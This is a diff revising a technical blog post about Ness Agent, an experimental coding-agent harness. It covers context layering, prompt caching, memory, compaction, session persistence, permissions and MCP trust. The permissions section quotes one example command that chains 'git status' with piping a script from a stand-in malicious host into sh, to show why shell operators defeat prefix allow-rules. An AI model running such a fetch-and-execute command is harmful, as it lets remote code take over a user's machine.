@@ -1,18 +1,18 @@
 ---
-title: "Inside a Coding Agent: Building the Harness Around the Model"
+title: "Inside Ness Agent: Building the Harness Around the Model"
 date: "2026-08-09"
 description: "Context Engineering, Prompt Caching, Tools, Memory, Compaction, Permissions and the runtime architecture behind Ness Agent."
 slug: inside-coding-agent-building-the-harness-around-the-model
 ---
 Most discussions about coding agents begin with the model. With every new release, the first thing you see is the **Artificial Analysis Intelligence Index**. What is its intelligence score? What about token efficiency or cost? How long can it sustain an agentic trajectory? Or, increasingly, which company did the latest model supposedly hack?
 
-The LLM is one part of the agent. The coding model does not clone a repository, decide which files to keep in context, expose tools to itself, preserve state across turns, ask for permission before executing `rm`, or remember what happened forty tool calls ago.
+But the LLM is only one part of the agent. It does not clone a repository, decide what belongs in context, expose tools to itself, preserve state across turns, ask for permission before executing `rm`, or remember what happened forty tool calls ago.
 
-There needs to be a system around the model that does those things.
+**The harness does.**
 
-Recent evidence suggests that system matters almost as much as the model itself. [Claw-SWE-Bench](https://arxiv.org/pdf/2606.12344) compared coding-agent harnesses under controlled conditions. Across its sweeps, changing the model moved Pass@1 by 29.4 percentage points. Changing the harness while holding the model fixed moved it by 27.4 points. In one particularly striking result, the same GLM 5.1 backbone scored **19.1%** with a minimal adapter and **73.4%** with the full adapter.
+Recent evidence suggests that this systems layer matters almost as much as the model itself. [Claw-SWE-Bench](https://arxiv.org/pdf/2606.12344) found that changing the model moved Pass@1 by **29.4 percentage points**, while changing the harness with the model fixed moved it by **27.4 points**. On one GLM 5.1 setup, changing only the adapter moved performance from **19.1% to 73.4%**.
 
-A second recent analysis, _Dive into Claude Code_, describes the core of Claude Code as conceptually simple: call the model, execute its requested tools, feed the results back, repeat. Most of the engineering lives around that loop, in permissions, compaction, extensibility, subagents, context management and persistence.
+A second study, [*Dive into Claude Code*](https://arxiv.org/pdf/2604.14228v2), makes the same point from an architectural angle: the core agent loop is simple, call the model, execute tools, feed the results back, repeat. Most of the engineering sits around that loop.
 
 Those observations were also the motivation behind **Ness Agent**, an experimental coding-agent harness I have been building in Python. It is my attempt to understand and implement the systems layer around the model: a reusable LangGraph-based SDK plus an opinionated coding CLI with tools, plan/act modes, prompt layering, skills, MCP, permissions, memory, reflection, compaction, subagents, persistence and Git-worktree isolation.
 
@@ -23,8 +23,6 @@ This article is about that implementation, inspired by systems such as Claude Co
 ### 1. Start With the Stupidest Agent That Works
 
 Strip away the CLI, memory, skills, MCP, permissions, hooks and databases, and the remaining tool-using agent looks quite small.
-
-Conceptually:
 
 ```python
 messages = [user_message]
@@ -47,16 +45,7 @@ The problems appear when the trajectory gets longer.
 
 The conversation now contains file contents, grep results, test logs, compiler errors and patches. The repository may have changed substantially since the first turn. MCP servers may expose dozens of external tools. The agent may need domain-specific skills. Eventually the context window approaches its limit. And once the model can run shell commands, a model error is no longer just a bad answer.
 
-A naive tool loop has no concept of:
-
-- stable versus volatile context,
-- permission policy,
-- durable versus episodic memory,
-- deferred capabilities,
-- execution interception,
-- context compaction,
-- session replay,
-- or workspace isolation.
+A naive tool loop has no concept of stable versus volatile context, permission policy, durable versus episodic memory, deferred capabilities, execution interception, compaction, replay, or workspace isolation.
 
 **The hard part is maintaining the environment in which that loop continues to behave usefully.**
 
@@ -72,7 +61,7 @@ Ness is split into two major layers.
 
 ![Ness CLI, Ness Agent SDK, and Chat Model API stack](assets/flow4.png)
 
-`src/ness_agent/` contains the reusable agent runtime. `src/ness_cli/` contains the coding-specific adapter: project paths, model configuration, worktree bootstrap, pricing and the interactive terminal experience.
+`src/ness_agent/` contains the reusable agent runtime. `src/ness_cli/` contains the coding-specific adapter: project paths, model configuration, worktree bootstrap, pricing and the TUI.
 
 The SDK separates its major components as well. `NessAgent` defines an agent configuration; `Session` owns execution of a thread; `PromptLayers` owns context construction; `PermissionStore`, `HookRunner`, `SkillLoader`, `MCPRuntime`, `ThreadStore` and `MemoryStore` remain independent components.
 
@@ -103,11 +92,43 @@ At a high level, a Ness turn looks like this:
 
 The actual runtime uses LangGraph rather than literally spelling this as a Python `while True`, but conceptually the loop has not changed much.
 
+### 3. Session: The Runtime Boundary of a Conversation
+
+`NessAgent` describes an agent configuration. A `Session` turns that configuration into one live execution thread.
+
+The graph itself should not have to own every concern associated with a long-running interaction. A session needs identity, lifecycle, streaming, cancellation, resumability, mode transitions and observability around the graph.
+
+![Session runtime boundary: NessAgent configuration flows into Session(thread_id) with graph, mode, context, cancellation, usage, events, and resume, then into the agent graph](assets/flow5.png)
+
+Each `Session` is bound to a thread ID and owns the compiled LangGraph application and its checkpointer. It also keeps the interaction-level state that should not live globally on the reusable `NessAgent`: current mode, pending skills, context pressure, compaction requests, turn usage and cancellation state.
+
+Before a turn enters the graph, the session installs a `runtime context` containing the services needed during execution—permissions, persistence, project paths, skills and the agent configuration itself. This gives graph nodes and tools access to session-scoped dependencies without turning them into global process state.
+
+#### The graph produces execution; the session produces an API
+
+The graph emits lower-level execution events. `Session` translates them into an application-facing stream containing things such as assistant output, tool execution, approval requests, usage, compaction, warnings and interruptions.
+
+That boundary means a terminal UI, server or another host application can observe the runtime without depending directly on LangGraph's internal events.
+
+The same execution path powers both batched with `run()` and streaming usage with `stream()`. One interface collects the complete turn into a result, while another exposes events as they happen.
+
+The session also coordinates lifecycle operations such as plan/act transitions, staged skills, explicit compaction, context previews, resume/rollback bootstrapping and session-end reflection.
+
+### Cancellation is a state transition
+
+Interruption is one example of why this boundary matters.
+
+Simply cancelling the Python task can leave an agent conversation structurally invalid. The model may already have emitted tool calls for which no corresponding tool result was ever recorded.
+
+Ness therefore treats cancellation as a runtime state transition. When a turn is interrupted, the session repairs unresolved tool calls with synthetic failed `ToolMessage`s and records an interruption marker when necessary before allowing the next turn to continue.
+
+That means the next request begins from a structurally valid conversation rather than from a half-written model/tool exchange.
+
 ---
 
 ## Part II — Context Is the Architecture
 
-### 3. Context Window Is Working Memory
+### 4. Context Window Is Working Memory
 
 It is tempting to think of an agent context as:
 
@@ -141,7 +162,7 @@ Anthropic's [context-engineering](https://www.anthropic.com/engineering/effectiv
 
 The engineering problem therefore is:
 
-> **What information should be present, when should it appear, and how long should it remain?**
+> What information should be present, when should it appear, and how long should it remain?
 
 Ness organizes that problem into four layers.
 
@@ -155,15 +176,15 @@ L0 changes extremely rarely. L1 changes occasionally. L2 usually remains stable 
 
 That gives a general rule:
 
-> **Put information at the lowest-volatility layer that can correctly own it.**
+> Put information at the lowest-volatility layer that can correctly own it.
 
 ---
 
-### 4. Prompt Caching Dictates the Architecture
+### 5. Prompt Caching Dictates the Architecture
 
 Without caching, long-running agents repeatedly process much of the same prefix.
 
-Prompt caching allows providers to reuse previously processed prefixes. _Don't Break the Cache_ measured **41–80% API cost reductions** and **13–31% improvements in time to first token** across providers in its experiments.
+Prompt caching allows providers to reuse previously processed prefixes. [Don't Break the Cache](https://arxiv.org/abs/2601.06007) measured **41–80% API cost reductions** and **13–31% improvements in time to first token** across providers in its experiments.
 
 The constraint is that the prefix has to remain stable.
 
@@ -214,8 +235,6 @@ Branch state, todos, mode and episodic memory are expected to change frequently,
 
 L3 is instead rendered inside `<system-reminder>` tags and appended as an internally tagged tail `HumanMessage`. Fresh user turns receive the full current overlay; subsequent tool-loop iterations receive deltas. These messages exist in the checkpointed model context but are excluded from the semantic transcript, reflection input and durable CLI events.
 
-Conceptually:
-
 ```text
 [ L0: stable harness ]
 
@@ -227,9 +246,7 @@ Conceptually:
 
 <system-reminder>
   mode: PLAN
-  branch: feature/auth
-  dirty: true
-
+  branch: feature/auth  
   todos:
     - verify tests
 
@@ -242,21 +259,18 @@ This preserves model visibility without repeatedly rewriting the stable prefix, 
 
 ---
 
-### 5. Why Plan Mode Still Has Write Tools
+### 6. Why Plan Mode Still Has Write Tools
 
 The intuitive implementation of plan mode is:
 
 ```text
 ACT MODE tools:
-  read
-  write
-  edit
-  shell
-  grep
+  [All Tools]
 
 PLAN MODE tools:
   read
-  grep
+  search
+  web
 ```
 
 That appears clean: the model cannot even see the write tools while planning.
@@ -275,7 +289,7 @@ Plan modes are common across coding agents. The interesting part, in my opinion,
 
 ---
 
-### 6. Tools: Capability Without Context Explosion
+### 7. Tools: Capability Without Context Explosion
 
 Ness groups its session capabilities into several broad tiers:
 
@@ -287,8 +301,8 @@ Always available
 
 Core coding
   ├── read / write / edit / delete
-  ├── search
-  ├── web
+  ├── grep / glob
+  ├── web_search / fetch_url
   └── shell
 
 Discovery
@@ -314,13 +328,13 @@ There is an important caveat: **adding a tool is itself a context mutation**. De
 
 There is also a more radical answer: **keep the primitive tool surface extremely small.**
 
-Pi is a good example. Its default coding agent exposes only four tools: `read`, `write`, `edit` and `bash`. Everything else is treated as an extension rather than part of the core harness surface.
+**Pi** is a good example. Its default coding agent exposes only four tools: `read`, `write`, `edit` and `bash`. Everything else is treated as an extension rather than part of the core harness surface.
 
-Ness currently takes a richer approach: filesystem operations, search, planning primitives, subagents and tool discovery are first-class model tools, while MCP capabilities are progressively exposed. A future version may move closer to the Pi model, allowing users to install tool packages from the CLI and explicitly bind, unbind or rebind tool groups between sessions.
+Ness currently takes a richer approach. A future version may move closer to the Pi model, allowing users to install tool packages from the CLI and explicitly bind, unbind or rebind tool groups between sessions.
 
 ---
 
-### 7. Skills: Procedural Knowledge With Progressive Disclosure
+### 8. Skills: Procedural Knowledge With Progressive Disclosure
 
 Unlike tools, skills answer a different question:
 
@@ -328,7 +342,13 @@ Unlike tools, skills answer a different question:
 
 A React repository may have local conventions for state management. A company may have a release procedure. Putting every procedure into the global system prompt would be wasteful.
 
-Ness supports filesystem-backed skills, with each skill represented by a `SKILL.md` containing metadata and instructions. A one-line catalog is present in L1:
+Ness supports filesystem-backed skills, with each skill represented by a `SKILL.md` containing metadata and instructions.
+
+The SDK is not tied to a single `.ness/skills/` directory. `SkillLoader` can search multiple user-provided roots, and the CLI can opt into well-known project-local and global locations such as: `.agents/skills`, `.claude/skills`, `.cursor/skills`
+
+Custom roots can be supplied as well. This makes it possible to reuse procedural knowledge already stored for other coding agents rather than forcing every project into a Ness-specific directory.
+
+Only lightweight metadata is exposed eagerly. A one-line catalog of discovered skills is placed in L1:
 
 ```text
 react_component:
@@ -340,18 +360,24 @@ Prepare and verify a release.
 path: .ness/skills/release/SKILL.md
 ```
 
-When the model decides a skill is relevant, it calls `skill_view` or reads the file. Only then does the complete procedure enter the conversation. Successfully viewed skills are represented in L3 as metadata, while their bodies remain in tool history. After compaction, that metadata lets the model discover and load them again.
+The full body remains outside context until the model explicitly requests it through `skill_view`.
 
-The architectural flow for skills and MCP is similar:
+I borrowed this tool-based loading pattern from OpenCode's skill mechanism: expose enough metadata for discovery, then load the complete instructions only when the procedure is actually selected.
 
-> **Expose cheap metadata eagerly; expose expensive context on demand.**
+Ness also supports category nesting under skill roots, so skills do not all have to live one directory below the root. Discovery currently recurses up to three levels and stops descending once it finds a `SKILL.md`.
+
+Successfully viewed skills are represented in L3 as metadata while their full bodies remain in tool history. After compaction, that metadata gives the model enough information to load the skill again if it is still relevant.
+
+The workflow for skills and MCP is similar:
+
+> Expose cheap metadata eagerly; expose expensive context on demand.
 
 ```text
 MCP tools
 
 name + description in L1
           ↓
-       discover
+       discover tools
           ↓
    selected full schema
           ↓
@@ -366,16 +392,15 @@ name + description in L1
           ↓
       full SKILL.md
 ```
-
 ---
 
 ## Part III — Building Agents That Survive Long Sessions
 
-### 8. Memory Is Not the Conversation
+### 9. Memory Is Not the Conversation
 
-The 2026 survey _Memory for Autonomous LLM Agents_ describes agent memory as a **write → manage → read** loop: what gets written, how it is transformed, and when it returns to context.
+The 2026 survey [Memory for Autonomous LLM Agents](https://arxiv.org/pdf/2603.07670) describes agent memory as a **write → manage → read** loop: what gets written, how it is transformed, and when it returns to context.
 
-Ness currently has three distinct persistent/contextual layers:
+Ness takes a deliberately simple approach. Instead of treating memory as one generic store, it separates information by lifetime:
 
 ```text
 Global USER.md
@@ -388,11 +413,13 @@ Project .ness/NESS.md
     └── durable repository conventions
         loaded into L1
 
-Per-session episodic memory
+Per-thread episodic memory
     │
     └── reflected observations
         loaded into L3
-```
+````
+
+These filesystem paths are configurable, and the SDK exposes a `MemoryBackend` interface so the storage implementation can be replaced entirely if a host application needs something other than Markdown files.
 
 #### Durable project memory
 
@@ -405,21 +432,22 @@ It contains stable project instructions and conventions and can include existing
 @CLAUDE.md
 ```
 
-Ness resolves these relative to the project, guards against cycles and escapes, and includes the assembled result in L1.
+Ness resolves these includes relative to the project root while guarding against path escapes, cycles and uncontrolled growth.
 
-Crucially, reflection does not continuously rewrite this file. It remains human-authored unless the user explicitly asks the agent to edit it or requests an opt-in draft. If the agent chooses the wrong trajectory, automatically promoting that reflection into durable memory could reinforce the mistake.
+Crucially, reflection does not continuously rewrite `NESS.md`. It remains human-authored unless the user explicitly chooses to modify it. If the agent takes the wrong trajectory, automatically promoting that reflection into durable project memory could reinforce the mistake.
 
 #### Episodic session memory
 
 Ness maintains a per-thread scratchpad under `.ness/runtime/sessions/`.
 
-Reflection runs after enough new message tokens accumulate relative to the usable context budget. A separate reflection model extracts structured observations and appends at most two bullets per run. Those bullets return on later turns through L3.
+Reflection runs periodically as a separate model operation and extracts a bounded set of observations from recent execution history. Those observations return on later turns through L3.
 
-There are two reflection triggers: the reflection-token ratio and session end. Reflection is optional; users may disable it because additional model calls can be inconvenient, and in coding tasks the current repository state may matter more than older memories.
+Reflection is optional. Extra model calls have a cost, and for coding tasks the current repository state may often be more important than an increasingly elaborate model-generated memory.
+
 
 ---
 
-### 9. Compaction Is Lossy Compression of Execution State
+### 10. Compaction Is Lossy Compression of Execution State
 
 Every sufficiently long-running agent eventually hits the same physical constraint: the context window fills up. If the session is expected to continue, some part of its history eventually has to be dropped, externalized or compressed.
 
@@ -427,11 +455,11 @@ In Ness `v0.1.0`, I took the straightforward route: extract the older transcript
 
 The problem was that this created an entirely new request shape, so the expensive conversation prefix could no longer reuse the prompt cache.
 
-Anthropic describes exactly this failure mode in its Claude Code caching post. Its solution is a **cache-safe fork**: reuse the same system prompt, tools, context and conversation prefix as the parent request, then append the summarization instruction as one additional user message.
+Anthropic describes exactly this failure mode in its Claude Code [caching post](https://claude.com/blog/lessons-from-building-claude-code-prompt-caching-is-everything). Its solution is a **cache-safe fork**: reuse the same system prompt, tools, context and conversation prefix as the parent request, then append the summarization instruction as one additional user message.
 
 Ness `v0.2.0` uses the same idea.
 
-When compaction is due, Ness starts from the last successfully completed bound main-model request—the same system message, provider session, tool definitions and native model history—and appends a human summary instruction. Failed model or schema attempts never replace this known-good parent binding.
+When compaction is due, Ness starts from the last successfully completed bound main-model request the same system message, provider session, tool definitions and native model history and appends a human summary instruction. Failed model or schema attempts never replace this known-good parent binding.
 
 ![Cache-safe compaction fork: identical prefix plus summary instruction](assets/flow3.png)
 
@@ -456,13 +484,13 @@ Here `messages` and `model` are not a new summarization setup. They are the exac
 The current policy uses pressure bands:
 
 ```text
-context pressure < 70%
+low pressure
     normal operation
 
-70% ≤ pressure < 80%
+elevated pressure
     warning
 
-pressure ≥ 80%
+high pressure
     summary compaction
 ```
 
@@ -472,23 +500,49 @@ More importantly, **the active turn is not summarized**.
 
 The latest unanswered user message and its assistant/tool trajectory remain verbatim. Only completed history is compressed. The live trajectory may still contain exact file contents, command output or test failures needed for the next action.
 
-After compaction, old L3 overlays are removed and a fresh overlay is rendered so stale working state does not survive merely because it appeared in historical context.
+The resulting summary is inserted as internal continuation context followed by the untouched active turn. Old L3 overlays are removed and rebuilt, so stale working state does not survive merely because it appeared in historical context.
 
-Cache-safe compaction solves the **cost and prefix-reuse problem**, not the harder information-loss problem. A summary can preserve the broad story while dropping exactly the details a coding agent later needs.
+> A small but important note: the compaction model keeps the parent's bound tool schema for cache stability, but any attempted tool call during summarization is treated as an error.
 
-Factory's evaluation of context-compression methods on software-engineering trajectories makes this concrete. Artifact tracking was difficult across every method they tested: remembering which files had been created, modified or inspected scored only **2.19–2.45 out of 5**.
+Cache-safe compaction solves the **cost and prefix-reuse problem**, not the harder information-loss problem.
+
+[Factory AI's](https://factory.ai/news/evaluating-compression) evaluation of context-compression methods on software-engineering trajectories makes this concrete. Artifact tracking was difficult across every method they tested: remembering which files had been created, modified or inspected scored only **2.19–2.45 out of 5**.
+
+Compaction is still lossy compression of execution state.
+
+---
+
+### 11. A Transcript Is Not Enough
+
+A rendered chat transcript does not capture everything that happened during an agent run.
+
+Tool calls, failures, permission decisions, usage, compaction events, subagent runs and resumable state all have structure that should not be flattened into assistant text.
+
+Ness therefore persists sessions through a durable `ThreadStore`, currently backed by SQLite, using append-oriented execution events alongside conversation state and metadata.
+
+That gives the runtime three useful properties:
+
+- **Resume:** a thread can continue after the original process exits.
+    
+- **Fork:** execution can branch from an earlier point with reconstructed conversational and session state.
+    
+- **Debug:** model failures, tool failures, permission rejections and other runtime events remain distinguishable.  
+
+This also explains why session replay and graph checkpoints are different things.
+
+A checkpoint is useful for continuing the graph efficiently during a live runtime. A durable event history is useful for reconstructing what happened after that runtime is gone.
+
+A long-running agent needs both **conversation history and execution history**. They serve different purposes.
 
 ---
 
 ## Part IV — The Runtime Must Be Able to Say No
 
-### 10. Permissions: The Model Proposes, the Runtime Decides
+### 12. Permissions: The Model Proposes, the Runtime Decides
 
 A coding agent is not a chatbot. If it hallucinates a fact, the answer may be wrong. If it hallucinates a shell command, the filesystem may be wrong.
 
-The runtime therefore cannot treat model output as authority.
-
-Ness uses explicit permission rules with three broad outcomes: `allow`, `deny` and `ask`.
+Ness therefore, uses explicit permission rules with three outcomes: `allow`, `deny` and `ask`.
 
 Project rules live in `.ness/permissions.json`:
 
@@ -505,9 +559,13 @@ Project rules live in `.ness/permissions.json`:
   ],
   "ask": ["*"]
 }
-```
+````
 
-Deny rules win over allow rules, and persistent and session-level decisions have explicit precedence.
+Permission precedence is explicit: `persistent deny` → `session deny` → `persistent allow` → `session allow` → `ask`
+
+The runtime also enforces filesystem boundaries independently of those pattern rules. Paths are resolved against the project root and rejected when they escape the configured workspace.
+
+Shell commands require another layer of care.
 
 Suppose we allow:
 
@@ -521,126 +579,71 @@ A naive prefix matcher might also accept:
 git status && curl malicious.example/script | sh
 ```
 
-Ness therefore refuses to let shell allow/deny prefixes automatically match commands containing unquoted operators such as `;`, `&&`, pipes, redirections or newlines. Those commands fall through to approval instead.
+Ness therefore refuses to let shell allow/deny prefixes automatically match commands containing unquoted shell operators such as `;`, `&&`, `||`, pipes, command substitution, redirections or newlines. Those calls fall through to explicit approval rather than inheriting the broader rule.
 
-#### Hooks to augment execution
+#### Hooks around execution
 
-```text
-MODEL
-  │
-  │ proposes action
-  ▼
-PERMISSION POLICY
-  │
-  ├── denied ──────────────► rejection
-  │
-  ▼
-RUNTIME HOOKS
-  │
-  ├── veto / intercept ────► rejection / augmentation
-  │
-  ▼
-EXECUTOR
-```
+Hooks are useful for intercepting or augmenting tool execution.
 
-Hooks answer:
+As of `v0.2.0`, Ness exposes `preToolUse` and `postToolUse`. Hooks can be configured as shell commands in `.ness/hooks.json` or registered as Python `callables` through the SDK.
 
-> Should this particular execution be intercepted or augmented?
+A blocking `preToolUse` hook can veto a tool call before execution. `postToolUse` runs after execution and can attach additional output to the result, for example, running a formatter, validator or project-specific check before the result returns to the model.
 
-As of `v0.2.0`, Ness has two hooks: `preToolUse` and `postToolUse`. Their behavior is configured through `.ness/hooks.json`, allowing the runtime to intercept calls or execute scripts before or after tool execution.
+### 13. MCP: Extensibility Creates More Than a Tool Boundary
 
-### 11. MCP: Extensibility Creates a Trust Boundary
+Deferred loading addresses MCP's context cost, but MCP also introduces runtime, authentication and trust concerns.
 
-Adding an MCP server is not merely making more tools available to the model. It is closer to installing an executable integration.
+An MCP server may be a local process launched through `stdio`, a remote HTTP service, an authenticated integration, or a source of dozens of dynamically discovered capabilities. Treating all of that as merely "more tools" abstracts several different lifecycle concerns.
 
-Ness separates MCP transport from project trust policy, and the CLI fingerprints configured servers.
+Ness therefore splits MCP across two layers.
 
-When an interactive session encounters a changed non-empty MCP configuration, it shows a redacted summary and asks the user to trust that exact configuration. Changing a command, endpoint, credentials or server set requires trust again. Headless mode does not silently approve an unknown server, even under `--yolo`; untrusted servers are skipped.
+The SDK exposes an adapter-neutral `MCPRuntime`. It accepts already-resolved server specifications and owns connection lifecycle, transport, server state, discovery and invocation.
 
-_Permission to CALL an MCP tool ≠ Trust to START the MCP server._
+Project configuration formats, trust policy, authentication, credential persistence and terminal interaction deliberately remain outside that runtime. The Ness CLI provides one such adapter.
+
+![MCP split across CLI policy and SDK runtime: project config through trust and OAuth to MCPServerSpec, then MCPRuntime discovery and invocation into the agent tool registry](assets/flow6.png)
+
+This separation matters because **permission to use a tool and permission to start the system that provides that tool are different decisions**.
+
+The CLI fingerprints runnable MCP configurations so a changed configuration crosses the trust boundary again rather than silently inheriting an earlier approval. Headless execution does not implicitly convert an unknown configuration into a trusted one.
+
+Configuration import is separate again. Importing a compatible server definition makes the configuration available; it does not automatically authorize that server for execution.
+
+> Importing configuration ≠ trusting execution ≠ authorizing a tool call.
+
+These are three different lifecycle decisions.
+
+There is considerably more machinery behind this such as authentication, secret handling, error isolation, connection state, timeouts and compatibility imports. But those are MCP-specific concerns rather than the focus of this article.
 
 ---
 
 ## Part V — Parallelism Solves an Isolation Problem
 
-### 12. Subagents Give You More Context Windows
+### 14. Subagents Give You More Context Windows
 
 Subagents are primarily useful for **parallel investigation** and **context isolation**. Some coding agents go further and allow child agents to perform parallel task execution as well.
 
-Each child receives its own context window, while the parent receives the result rather than the entire intermediate trajectory. In that sense, a subagent is partly a **context-window partitioning primitive**.
+Each child gets its own context window, while the parent receives only the result rather than the entire intermediate trajectory. In that sense, a subagent is partly a **context-window partition**.
 
 Ness's implementation is deliberately conservative.
 
-Today, each subagent is effectively a separate model call with a filtered, read-only tool surface. The child investigates independently and returns a structured result to the parent instead of becoming a long-lived participant in the parent's execution graph.
+Today, each subagent runs as its own child graph with an independent thread ID and a filtered, read-only tool surface. It does not inherit the parent's full conversation. Instead, it receives a scoped assignment plus role-specific instructions and returns only its final aresult to the parent.
 
-Write operations, shell execution, MCP tools, `todo`, nested subagents and other state-changing capabilities are rejected. The parent waits for the batch to complete, fail or time out and receives structured results containing status, duration and output.
+The parent can launch several investigations concurrently, but fan-out is bounded both per batch and globally. Each run is tracked with status, duration, thread ID and output, and is registered against the parent thread for relation and persistence.
 
 The reason is that **parallel reasoning and parallel execution are very different problems**.
 
 Once a child can mutate files or invoke external systems, isolation has to extend beyond context into workspace, permissions and state.
 
-So execution-capable subagents would require a different architecture. Rather than treating a child as a disposable model call, I would likely make it a persistent extension of the main agent graph, with its own session ID linked to the parent thread. That would give the child independent state, permissions and workspace boundaries while preserving explicit parent-child lineage.
+So execution-capable subagents would require a different architecture. Rather than treating a child as a investigative run, I would likely make it a more persistent extension of the main agent graph, with its own session identity linked to the parent thread. That would give the child independent state, permissions and workspace boundaries while preserving explicit parent-child relation.
 
 For now, Ness uses subagents as parallel researchers rather than parallel workers.
-
-### 13. Git Worktrees Solve Workspace Isolation
-
-Two agents can have completely separate model contexts and still interfere with each other if they share the same checkout.
-
-Git worktrees provide a lightweight way to give each agent its own branch and filesystem state without cloning the repository again.
-
-Ness supports worktree-backed sessions for exactly this reason:
-
-```text
-repo
-├── main
-├── worktree/auth
-└── worktree/frontend
-```
-
-Git worktrees themselves are not new. What is interesting is their role in coding-agent architecture: they become a **workspace-isolation primitive**.
-
-```text
-context isolation    → what the model sees
-runtime isolation    → what an agent's processes/tools can affect
-workspace isolation  → what code state an agent can mutate
-```
-
-### 14. A Transcript Is Not Enough
-
-A rendered chat transcript does not capture everything that happened during an agent run. Tool calls, failures, permission decisions, costs, subagent runs and resumable state all need their own representation.
-
-Ness therefore persists sessions in a SQLite-backed thread store, with append-oriented event payloads and metadata for cost, turns, summaries and subagent runs.
-
-This gives the runtime a few useful properties:
-
-- **Resume:** a thread can continue after the process exits.
-    
-- **Fork:** Ness can branch from an earlier human-message point while copying conversation state and session memory.
-    
-- **Debug:** model failures, tool failures and permission rejections remain distinguishable instead of being flattened into chat text.
-
-A long-running agent needs both _conversation history and execution history_; they serve different purposes.
-
-### 15. Most Agent Features Are Really Context Management
-
-By this point, many mechanisms that look like separate agent features start to converge.
-
-Prompt layers control **where** information lives. Skills and deferred tools control **when** it enters context. Memory controls **what survives**. Compaction controls **what gets compressed**. Subagents control **what gets isolated into another context**. Prompt caching adds one more constraint: **how stable that context remains over time**.
-
-This is the conceptual core of Ness for me:
-
-> **A coding harness is largely a context lifecycle manager attached to an execution runtime.**
-
-The important question is no longer just _what should the model know?_ It is also _when should it know it, how long should it keep it, where should it live, and what happens when that information changes?_
-
-That is why agent architecture starts to look much closer to systems engineering than traditional prompt engineering.
 
 ---
 
 ## Part VI — What Ness Does Not Solve
 
-### 16. What I Still Don't Know
+### 15. What I Still Don't Know
 
 It would be easy to present all of these architectural choices as improvements. I cannot make that claim yet.
 
@@ -658,15 +661,11 @@ There are also obvious weaknesses:
     
 - **Cache-aware design inherits provider assumptions.** Different APIs may reward different prompt layouts.
     
-- **Subagents trade context isolation for more tokens and coordination.**
-    
 - **Permissions become much harder in remote execution**, where filesystems, credentials, networks and long-running approvals become part of the authorization problem.
 
-So for now, I think of Ness less as a proven optimal harness and more as an experimental architecture built from a set of informed bets.
+So for now, I think of Ness less as a proven optimal harness and more as an experimental architecture built from a set of informed bets. The open question is which of those bets actually matter.
 
-The open question is which of those bets actually matter.
-
-### 17. If I Were to Evaluate the Harness
+### 16. If I Were to Evaluate the Harness
 
 If I do evaluate Ness more rigorously, I would want to measure both **task quality** and **systems behavior**.
 
@@ -680,34 +679,17 @@ At minimum:
 - total cost and latency
 - whether important state survives compaction
 
-Some of these experiments are expensive enough that they may make more sense collaboratively. If a research lab or model/infrastructure provider is interested in evaluating harness-level design choices, I'd be open to running the experiments together.
-
 One idea I am exploring is a separate **Ops/evaluation package** for tuning the harness itself.
 
-Instead of treating prompts, tool descriptions, overlay contents and memory policies as fixed configuration, the package could evaluate variants against benchmark datasets—or a user's own representative workloads—and use an LLM judge alongside systems metrics to score resulting trajectories.
+Instead of treating prompts, tool descriptions, overlay contents and memory policies as fixed configuration, the package could evaluate variants against benchmark datasets or a user's own representative workloads and use an LLM judge alongside systems metrics to score resulting trajectories.
 
-Conceptually:
-
-```text
-tasks / user workloads
-        ↓
-harness variants
-  ├── prompts
-  ├── tool descriptions
-  ├── overlays
-  ├── memory policy
-  └── compaction policy
-        ↓
-agent trajectories
-        ↓
-LLM judge + systems metrics
-        ↓
-candidate configuration
-```
+![Harness tuning loop: tasks and workloads through harness variants to agent trajectories, scored by LLM judge and systems metrics into candidate configuration](assets/flow7.png)
 
 That would be closer to **tuning the harness around a user's workload** than benchmarking one static agent.
 
-A stronger external benchmark, such as Terminal-Bench, could then be used as a separate sanity check rather than as the optimization target itself.
+A stronger external benchmark, such as **Terminal-Bench**, could then be used as a separate sanity check rather than as the optimization target itself.
+
+> **Some of these experiments can become expensive quickly. If I push this direction further, collaboration with research labs or model/infrastructure providers may make more sense than trying to evaluate every harness dimension independently.**
 
 ---
 
